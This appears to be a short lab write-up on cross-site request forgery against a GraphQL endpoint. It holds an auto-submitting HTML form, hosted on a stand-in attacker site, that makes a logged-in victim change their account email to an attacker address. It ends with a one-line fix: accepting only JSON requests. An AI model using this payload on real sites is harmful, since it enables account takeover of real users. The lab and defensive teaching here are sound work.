# Lab 5 — Performing CSRF Exploits over GraphQL (PRACTITIONER)

## Vulnerability
GraphQL mutation accessible via GET and form-encoded POST without CSRF
token validation — allows cross-site request forgery attacks.

## Quick Exploit
```html
<!-- Host on attacker.com — victim visits page while logged into victim.com -->
<form method="POST" action="https://victim.com/graphql"
      enctype="application/x-www-form-urlencoded">
  <input name="query"
         value='mutation { changeEmail(email: "attacker@evil.com") { email } }'>
</form>
<script>document.forms[0].submit()</script>
```

## Fix (one-liner)
Only accept `Content-Type: application/json` — this alone triggers a CORS
preflight that blocks cross-origin form submissions.
